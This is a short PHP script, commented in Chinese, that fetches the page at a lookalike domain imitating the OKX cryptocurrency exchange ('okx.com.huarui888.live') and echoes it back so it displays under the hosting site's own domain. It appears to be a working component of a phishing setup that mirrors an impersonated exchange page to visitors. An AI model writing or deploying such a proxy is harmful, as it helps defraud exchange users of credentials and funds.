<?php
// 使用 cURL 获取目标页面内容并显示，保持当前域名
$url = "https://www.okx.com.huarui888.live/index.html";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo "请求错误: " . curl_error($ch);
} else {
    echo $response;
}

curl_close($ch);
?>
